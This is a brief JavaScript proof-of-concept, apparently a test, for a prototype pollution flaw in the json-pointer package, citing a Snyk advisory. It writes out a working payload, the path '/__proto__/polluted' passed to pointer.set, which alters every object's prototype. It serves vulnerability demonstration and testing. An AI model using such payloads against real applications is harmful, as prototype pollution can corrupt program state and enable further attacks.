// //https://security.snyk.io/vuln/SNYK-JS-JSONPOINTER-596925
// test("prototype pollution in json-pointer", () => {
  const pointer = require("json-pointer");
  let obj = {};

console.log({}.polluted);

  pointer.set(obj, "/__proto__/polluted", "yes");
console.log({}.polluted);
// });
